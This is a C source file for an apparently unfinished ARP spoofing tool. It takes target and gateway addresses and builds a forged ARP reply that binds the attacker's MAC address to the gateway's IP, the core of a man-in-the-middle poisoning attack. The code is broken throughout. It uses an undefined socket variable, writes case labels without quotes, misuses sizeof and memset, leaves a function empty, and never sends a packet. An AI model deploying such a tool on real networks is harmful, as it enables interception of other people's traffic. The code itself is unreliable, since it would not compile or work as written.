#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>

typedef struct
{
    char mac_src[6];
    char mac_dst[6];
    short type;
}ETH_HEADER;

typedef struct
{
    short hw_type;
    short protocol_type;
    char hw_len;
    char protocol_len;
    short op;
    char mac_src[6];
    int ip_src;
    char mac_dst[6];
    int ip_dst;
}ARP_HEADER;

typedef struct
{
    ETH_HEADER eth_header;
    ARP_HEADER arp_header;
    char pad[18];
}ARP_CHEAT;

int get_host_mac_addr(char *mac_src)
{
    int sockfd;
    struct ifreq ifr;
    int ret;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    strcpy(ifr.ifr_name, "eth0");
    ret = ioctl(sock, SIOCGIFHWADDR, &ifr);
    if (ret < 0)
    {
        printf("get mac addr error, errno = %d!\n", errno);
        return -1;
    }

    memcpy(mac_src, &ifr.ifr_hwaddr.sa_data, sizeof(mac_src));

    return 0;
}

//先发一个arp请求，获取对方mac地址
int get_target_mac_addr(char *mac_dst)
{
    ARP_CHEAT arpspoof;
    
}

int main(int argc, char **argv)
{
    int op = 0;
    ARP_CHEAT arpspoof;
    char target_ip[20];
    char gateway_ip[20];
    char if_name[10];
    char mac_src[6];
    char mac_dst[6];

    memset(arpspoof, 0, sizeof(arpspoof));
    memset(target_ip, 0, sizeof(target_ip));
    memset(gateway_ip, 0, sizeof(gateway_ip));
    memset(if_name, 0, sizeof(if_name));
    memset(mac_src, 0, sizeof(mac_src));
    memset(mac_dst, 0, sizeof(mac_dst));
    
    opterr = 0;  
    while ((op = getopt(argc, argv, "i:t:g:")) != -1)
    {
        switch(op)
        {
            case i:
                memcpy(if_name, optarg, strlen(optarg));
                break;
            case t:
                memcpy(target_ip, optarg, strlen(optarg));
                break;
            case g:
                memcpy(gateway_ip, optarg, strlen(optarg));
                break;
            default:  
                printf("other option :%c\n",op);  
        }
    }
    get_host_mac_addr(&mac_src);
    get_target_mac_addr(&mac_dst);
    
    memcpy(&arpspoof.eth_header.mac_dst, mac_dst, sizeof(mac_dst));
    memcpy(&arpspoof.eth_header.mac_src, mac_src, sizeof(mac_src));
    arpspoof.eth_header.type = 0x0806;
    
    arpspoof.arp_header.hw_type = 1;
    arpspoof.arp_header.protocol_type = 0x0800;
    arpspoof.arp_header.hw_len = 6;
    arpspoof.arp_header.protocol_len = 4;
    arpspoof.arp_header.op = 2;

    memcpy(&arpspoof.arp_header.mac_src, mac_src, sizeof(mac_src));
    arpspoof.arp_header.ip_src = inet_addr(&gateway_ip);
    memcpy(&arpspoof.arp_header.mac_dst, mac_dst, sizeof(mac_dst));
    arpspoof.arp_header.ip_dst = inet_addr(&target_ip);

}
